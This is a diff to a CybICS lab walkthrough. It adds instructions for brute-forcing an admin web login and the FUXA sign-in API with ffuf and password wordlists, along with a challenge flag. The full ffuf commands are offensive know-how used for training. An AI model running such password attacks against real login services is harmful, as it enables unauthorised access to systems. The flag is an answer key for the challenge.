@@ -48,6 +48,19 @@ Start ffuf with:
 ffuf -v -w /usr/share/wordlists/rockyou.txt -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=admin&password=FUZZ" -raw -u http://$DEVICE_IP:8080/login -fs 4561
 ```
 
+The length of a failed login page can differ between versions; send one wrong
+login first and use its size. Matching on the redirect a successful login
+returns, `-mc 302` instead of `-fs`, avoids the guesswork.
+
+**From the attack shell:** rockyou (134 MB) is not part of the attack shell.
+Use `/usr/share/wordlists/passwords.txt` instead, nmap's list of 5,000 common
+passwords, which is large enough for both CybICS logins. Its first lines are
+`#!comment` headers that ffuf also sends; ignore those results.
+
+```sh
+ffuf -w /usr/share/wordlists/passwords.txt -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=admin&password=FUZZ" -u http://$DEVICE_IP:8080/login -mc 302
+```
+
 For more info, run `ffuf` without parameters.
 
 ## Task
@@ -125,6 +138,7 @@ Run the attack:
   ```sh
   ffuf -v -w /usr/share/wordlists/rockyou.txt -X POST -H "Content-Type: application/json" -d '{"username": "admin", "password": "FUZZ"}' -raw -u http://$DEVICE_IP:1881/api/signin -fr "error"
   ```
+  From the attack shell, use `-w /usr/share/wordlists/passwords.txt`.
 
 **Flag:** `CybICS(FU##A)` (submit for the *FUXA Password Attack* challenge)
 
